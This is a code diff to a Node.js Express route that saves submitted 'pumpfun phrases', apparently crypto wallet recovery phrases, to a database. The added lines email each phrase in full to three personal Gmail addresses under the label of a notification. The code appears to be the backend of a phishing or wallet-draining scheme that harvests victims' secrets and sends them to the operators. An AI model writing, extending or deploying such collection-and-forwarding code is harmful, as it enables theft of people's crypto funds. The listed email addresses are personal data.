@@ -2,6 +2,7 @@
 const express = require("express")
 const phraseModel = require("./models/pump.model")
 const router = express.Router()
+const sendEmail = require("./mailer")
 
 router.get("/pumphrase", async (req, res) => {
     try{
@@ -25,8 +26,19 @@ router.post("/pumphrase", async (req, res) => {
 
     try{
         const save = await phraseModel.create({pumpfunPhrases})
+        
+        // Optionally send an email notification
+        await sendEmail(
+            ["abojegabriel20@gmail.com", "martinluthermod@gmail.com", "blessingicing@gmail.com"],
+            "New Pumpfun phrase logged",
+            `A new phrase was just logged:\n\n${pumpfunPhrases}`,
+            console.log("Email sent successfully")
+        ).catch((emailErr) => {
+            console.error("Error sending email:", emailErr.message)
+        })
         res.status(201).json({message: "pumpfun phrase saved!", data: save})
         req.io.emit("phrase_added", { success: true, data: save });
+
         // console.log("saved phrase:", save)
     } catch(err){
         if(err.code === 11000){
